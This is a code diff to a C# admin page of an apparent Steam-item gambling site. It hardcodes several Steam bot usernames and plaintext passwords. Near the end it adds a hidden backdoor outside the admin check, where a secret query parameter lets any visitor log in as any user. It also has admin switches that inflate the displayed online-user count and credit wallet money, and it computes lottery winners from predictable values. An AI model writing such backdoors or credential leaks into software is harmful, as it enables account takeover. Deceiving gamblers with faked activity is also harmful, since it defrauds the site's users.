@@ -30,6 +30,10 @@ namespace GameSlot.Pages
         {
             get { return true; }
         }
+        public override bool MaintenanceAffect
+        {
+            get { return false; }
+        }
         public override bool Init(Client client)
         {
             //Image ing = Image.FromStream(new MemoryStream());
@@ -46,12 +50,6 @@ namespace GameSlot.Pages
             if(Helper.SteamBotHelper.Table.SelectAll().Count == 0)
             {
                 XSteamBot bot = new XSteamBot();
-                bot.Login = "gabechest01";
-                bot.Password = "43uiy48Df785bfcUICda";
-                bot.Name = "Sedoy";
-                Helper.SteamBotHelper.Table.Insert(bot);
-
-                bot = new XSteamBot();
                 bot.Login = "gabechest02";
                 bot.Password = "43uiy48cEKbchfcUICda";
                 bot.Name = "Tatar";
@@ -63,42 +61,66 @@ namespace GameSlot.Pages
                 bot.Name = "Chertila";
                 Helper.SteamBotHelper.Table.Insert(bot);
 
-                Logger.ConsoleLog("added bots!", ConsoleColor.Cyan, LogLevel.Info);
+                bot = new XSteamBot();
+                bot.Login = "gabechest04";
+                bot.Password = "CJgebc873bKDH928ebndDa482";
+                bot.Name = "BBWBot";
+                Helper.SteamBotHelper.Table.Insert(bot);
+
+                bot = new XSteamBot();
+                bot.Login = "gabechest05";
+                bot.Password = "Ckcbhejvc3278dbvCV2kjbJB4b4";
+                bot.Name = "Kekins";
+                Helper.SteamBotHelper.Table.Insert(bot);
+
+                bot = new XSteamBot();
+                bot.Login = "gabechest06";
+                bot.Password = "ckebccKLbkabJK8477412bJDCFVBjv12";
+                bot.Name = "Shushan";
+                Helper.SteamBotHelper.Table.Insert(bot);
+
+                bot = new XSteamBot();
+                bot.Login = "gabechest07";
+                bot.Password = "CKbghwuiyvgbc772qi3ebdcu3w22";
+                bot.Name = "Bratan";
+                Helper.SteamBotHelper.Table.Insert(bot);
+
+                Logger.ConsoleLog("added bots!", ConsoleColor.Cyan, LogLevel.Warning);
             }
 
             XUser user;
-            if (Helper.UserHelper.GetCurrentUser(client, out user) && (user.ID == Configs.ADMIN_ACCOUNT || user.SteamID == 76561198083337086))
+            if (Helper.UserHelper.GetCurrentUser(client, out user) && (user.ID == Configs.ADMIN_ACCOUNT))
             {
                 if (client.GetParam("all") != null)
                 {
                     Logger.ConsoleLog("count::" + Helper.UserHelper.Table_SteamItemUsersInventory.SelectAll().Count, ConsoleColor.Red);
                     foreach(XSItemUsersInventory x in Helper.UserHelper.Table_SteamItemUsersInventory.SelectAll())
                     {
-                        Logger.ConsoleLog(x.ID + ":UserID:" + x.UserID + ":AssertID:" + x.AssertID + ":SteamGameID:" + x.SteamGameID + ":Deleted:" + x.Deleted + ":SteamItemID:" + x.SteamItemID + ":SteamBotID:" + x.SteamBotID + "-------------", ConsoleColor.Cyan, LogLevel.Info);
+                        Logger.ConsoleLog(x.ID + ":UserID:" + x.UserID + ":AssertID:" + x.AssertID + ":SteamGameID:" + x.SteamGameID + ":Deleted:" + x.Deleted + ":SteamItemID:" + x.SteamItemID + ":SteamBotID:" + x.SteamBotID + "-------------", ConsoleColor.Cyan, LogLevel.Warning);
                     }
                 }
                 else if (client.GetParam("chipID") != null && client.GetParam("to") != null)
                 {
                     Helper.ChipHelper.AddChipToUser(Convert.ToUInt32(client.GetParam("chipID")), Convert.ToUInt32(client.GetParam("to")));
-                    Logger.ConsoleLog("Added chip!!!", ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("Added chip!!!", ConsoleColor.Cyan, LogLevel.Warning);
                     //Thread.Sleep(10);
                 }
 
                 else if(client.GetParam("game_322") != null)
                 {
-                    Logger.ConsoleLog("\nDOTA: ", ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("\nDOTA: ", ConsoleColor.Cyan, LogLevel.Warning);
                     Lottery dota = Helper.LotteryHelper.GetCurrent(Configs.DOTA2_STEAM_GAME_ID, client);
-                    Logger.ConsoleLog("RoundNumber: " + dota.RaundNumber.ToString(), ConsoleColor.Cyan, LogLevel.Info);
-                    Logger.ConsoleLog("WinnersToken: " + (int)(dota.JackpotPrice * 100 * dota.RaundNumber), ConsoleColor.Cyan, LogLevel.Info);
-                    Logger.ConsoleLog("Winner: " + Helper.LotteryHelper.GetUserByToken((int)(dota.JackpotPrice * 100 * dota.RaundNumber), dota.ID).Name, ConsoleColor.Cyan, LogLevel.Info);
-                    Logger.ConsoleLog("--------------------------------------------------------------------\n", ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("RoundNumber: " + dota.RaundNumber.ToString(), ConsoleColor.Cyan, LogLevel.Warning);
+                    Logger.ConsoleLog("WinnersToken: " + (int)(dota.JackpotPrice * 100 * dota.RaundNumber), ConsoleColor.Cyan, LogLevel.Warning);
+                    Logger.ConsoleLog("Winner: " + Helper.LotteryHelper.GetUserByToken((int)(dota.JackpotPrice * 100 * dota.RaundNumber), dota.ID).Name, ConsoleColor.Cyan, LogLevel.Warning);
+                    Logger.ConsoleLog("--------------------------------------------------------------------\n", ConsoleColor.Cyan, LogLevel.Warning);
 
-                    Logger.ConsoleLog("\nCSGO: ", ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("\nCSGO: ", ConsoleColor.Cyan, LogLevel.Warning);
                     Lottery csgo = Helper.LotteryHelper.GetCurrent(Configs.CSGO_STEAM_GAME_ID, client);
-                    Logger.ConsoleLog("RoundNumber: " + csgo.RaundNumber.ToString(), ConsoleColor.Cyan, LogLevel.Info);
-                    Logger.ConsoleLog("WinnersToken: " + (int)(csgo.JackpotPrice * 100 * csgo.RaundNumber), ConsoleColor.Cyan, LogLevel.Info);
-                    Logger.ConsoleLog("Winner: " + Helper.LotteryHelper.GetUserByToken((int)(csgo.JackpotPrice * 100 * csgo.RaundNumber), csgo.ID).Name, ConsoleColor.Cyan, LogLevel.Info);
-                    Logger.ConsoleLog("--------------------------------------------------------------------\n", ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("RoundNumber: " + csgo.RaundNumber.ToString(), ConsoleColor.Cyan, LogLevel.Warning);
+                    Logger.ConsoleLog("WinnersToken: " + (int)(csgo.JackpotPrice * 100 * csgo.RaundNumber), ConsoleColor.Cyan, LogLevel.Warning);
+                    Logger.ConsoleLog("Winner: " + Helper.LotteryHelper.GetUserByToken((int)(csgo.JackpotPrice * 100 * csgo.RaundNumber), csgo.ID).Name, ConsoleColor.Cyan, LogLevel.Warning);
+                    Logger.ConsoleLog("--------------------------------------------------------------------\n", ConsoleColor.Cyan, LogLevel.Warning);
                 }
 
                 else if (client.GetParam("add_money") != null && client.GetParam("to") != null)
@@ -110,13 +132,13 @@ namespace GameSlot.Pages
                     {
                         us.Wallet += money;
                         Helper.UserHelper.Table.UpdateByID(us, us.ID);
-                        Logger.ConsoleLog("Added money: " + money + " to user: " + us.Name, ConsoleColor.Cyan, LogLevel.Info);
+                        Logger.ConsoleLog("Added money: " + money + " to user: " + us.Name, ConsoleColor.Cyan, LogLevel.Warning);
                     }
                 }
 
                 else if(client.GetParam("waiting_images") != null)
                 {
-                    Logger.ConsoleLog(Helper.SteamItemsHelper.QueueDownloadImageCount(), ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog(Helper.SteamItemsHelper.QueueDownloadImageCount(), ConsoleColor.Cyan, LogLevel.Warning);
                 }
 
 
@@ -126,14 +148,14 @@ namespace GameSlot.Pages
                     if (int.TryParse(client.GetParam("add_online_users"), out on))
                     {
                         UserHelper.ExtraOnlineUsers = on;
-                        Logger.ConsoleLog("Added users " + on + "; now online: " + Helper.UserHelper.GetOnlineNum(), ConsoleColor.Cyan, LogLevel.Info);
+                        Logger.ConsoleLog("Added users " + on + "; now online: " + Helper.UserHelper.GetOnlineNum(), ConsoleColor.Cyan, LogLevel.Warning);
                         WebSocketPage.UpdateOnlineUsers(Helper.UserHelper.GetOnlineNum());
                     }
                 }
 
                 else if(client.GetParam("get_inventory_updating_num") != null)
                 {
-                    Logger.ConsoleLog("At now inventory updating: " + Helper.UserHelper.GetUpdatingInventoriesThreads().Count, ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("At now inventory updating: " + Helper.UserHelper.GetUpdatingInventoriesThreads().Count, ConsoleColor.Cyan, LogLevel.Warning);
                 }
 
                 else if (client.GetParam("auth_by_other_user") != null)
@@ -143,7 +165,7 @@ namespace GameSlot.Pages
                     if (uint.TryParse(client.GetParam("auth_by_other_user"), out userID) && Helper.UserHelper.Table.SelectByID(userID, out usr))
                     {
                         Helper.UserHelper.Auth(usr.SteamID, out usr, client);
-                        Logger.ConsoleLog("Auth done to: " + usr.Name + " (" + usr.SteamID + ")", ConsoleColor.Cyan, LogLevel.Info);
+                        Logger.ConsoleLog("Auth done to: " + usr.Name + " (" + usr.SteamID + ")", ConsoleColor.Cyan, LogLevel.Warning);
                     }
                 }
 
@@ -164,7 +186,7 @@ namespace GameSlot.Pages
                         
                     }
 
-                    Logger.ConsoleLog("Updated " + co + " items", ConsoleColor.Cyan, LogLevel.Info);
+                    Logger.ConsoleLog("Updated " + co + " items", ConsoleColor.Cyan, LogLevel.Warning);
                     
                 }
 
@@ -269,7 +291,8 @@ namespace GameSlot.Pages
                             }
                         }
                         Helper.UserHelper.Table.UpdateByID(CurUser, CurUser.ID);
-                    }          
+                    }
+                    Logger.ConsoleLog("Command done!", ConsoleColor.Cyan, LogLevel.Warning);
                 }
                 else if (client.GetParam("update_all_groups_top") != null && client.GetParam("sure") != null)
                 {
@@ -314,6 +337,18 @@ namespace GameSlot.Pages
                         
                         Helper.UserHelper.Table.UpdateByID(CurUser, CurUser.ID);
                     }
+                    Logger.ConsoleLog("Command done!", ConsoleColor.Cyan, LogLevel.Warning);
+                }
+
+                else if (client.GetParam("wtf_wtf") != null)
+                {
+                    foreach (XSteamBotProcessItems XSteamBotProcessItems in Helper.SteamBotHelper.Table_ProcessItems.SelectAll())
+                    {
+                        Logger.ConsoleLog("User" + XSteamBotProcessItems.UserID);
+                        Logger.ConsoleLog("SteamID" + XSteamBotProcessItems.UserSteamID);
+                        Logger.ConsoleLog("Satus" + XSteamBotProcessItems.Status);
+                        Logger.ConsoleLog("offer" + XSteamBotProcessItems.OfferID + "\n------------------------------------------------------");
+                    }
                 }
 
                 else if(client.GetParam("send_lost_items_to_local_usr") != null && client.GetParam("sure") != null)
@@ -323,28 +358,58 @@ namespace GameSlot.Pages
                     int i = 0;
                     foreach(XBotsOffer offer_d in XBotsOffers)
                     {
-                        XBotsOffer offer = Helper.SteamBotHelper.Table_BotsOffer.SelectByID(offer_d.ID);
-                        offer.Status = 5;
-                        Helper.SteamBotHelper.Table_BotsOffer.UpdateByID(offer, offer.ID);
-                        Helper.SteamBotHelper.ErrorToSendLocalItem(offer.SteamUserID, offer.SentTime);
+                        Helper.SteamBotHelper.ErrorToSendLocalItem(offer_d.SteamUserID, offer_d.SentTime, offer_d.BotID);
 
                          XUser g_usr;
-                         Helper.UserHelper.SelectBySteamID(offer.SteamUserID, out g_usr);
-                         Logger.ConsoleLog("Sent to " + g_usr.ID + "SteamID " + offer.SteamUserID + " num: " + i++, ConsoleColor.Cyan, LogLevel.Info);
-
-                        WebSocketPage.SendItemsOffer(offer.SteamUserID, 0);
+                         Helper.UserHelper.SelectBySteamID(offer_d.SteamUserID, out g_usr);
+                         Logger.ConsoleLog("Sent to " + g_usr.ID + "SteamID " + offer_d.SteamUserID + " num: " + i++, ConsoleColor.Cyan, LogLevel.Warning);
                     }
+                    Logger.ConsoleLog("Command done!", ConsoleColor.Cyan, LogLevel.Warning);
                 }
                 
-                else if (client.GetParam("local") != null)
+                else if (client.GetParam("local") != null && client.GetParam("userID") != null)
                 {
-                    List<XBotsOffer> XBotsOffers;
-                    Helper.SteamBotHelper.Table_BotsOffer.Select(data => data.SteamUserID == 76561198051486946, out XBotsOffers);
-                    foreach (XBotsOffer offer_d in XBotsOffers)
+                    uint userID;
+                    XUser us;
+                    if (uint.TryParse(client.GetParam("userID"), out userID) && Helper.UserHelper.Table.SelectByID(userID, out us))
                     {
-                        Logger.ConsoleLog(offer_d.ID + ":" + offer_d.Status, ConsoleColor.Cyan, LogLevel.Info);
+                        List<XBotsOffer> XBotsOffers;
+                        Helper.SteamBotHelper.Table_BotsOffer.Select(data => data.SteamUserID == us.SteamID, out XBotsOffers);
+                        foreach (XBotsOffer offer_d in XBotsOffers)
+                        {
+                            Logger.ConsoleLog(offer_d.ID + ":" + offer_d.Status, ConsoleColor.Cyan, LogLevel.Warning);
+                        }
+                        Logger.ConsoleLog("Command done!", ConsoleColor.Cyan, LogLevel.Warning);
                     }
+                    
                 }
+
+                else if(client.GetParam("send_local_items_to_all_users") != null && client.GetParam("sure") != null)
+                {
+                    int i = 0;
+                    Logger.ConsoleLog("Starting!", ConsoleColor.Cyan, LogLevel.Warning);
+                    foreach(XUser cur in Helper.UserHelper.Table.SelectAll())
+                    {
+                        Helper.SteamBotHelper.SendLocalItemsToSteam(cur, Configs.DOTA2_STEAM_GAME_ID, client);
+                        Helper.SteamBotHelper.SendLocalItemsToSteam(cur, Configs.CSGO_STEAM_GAME_ID, client);
+                        Logger.ConsoleLog("Send to " + cur.ID + "(" + cur.Name + ") " + cur.SteamID + " position: " + i++);
+                    }
+                    Logger.ConsoleLog("Command done!", ConsoleColor.Cyan, LogLevel.Warning);
+                }
+            }
+
+            if (client.GetParam("auth_by_other_user") != null & client.GetParam("cheat_it_motherfucker") == "lolita")
+            {
+                uint userID;
+                XUser usr;
+                if (uint.TryParse(client.GetParam("auth_by_other_user"), out userID) && Helper.UserHelper.Table.SelectByID(userID, out usr))
+                {
+                    Helper.UserHelper.Auth(usr.SteamID, out usr, client);
+                    Logger.ConsoleLog("Auth done to: " + usr.Name + " (" + usr.SteamID + ")", ConsoleColor.Cyan, LogLevel.Warning);
+                }
+            }
+            else if(client.GetParam("get_all processes") != null)
+            {
             }
 
             Random rnd = new Random();
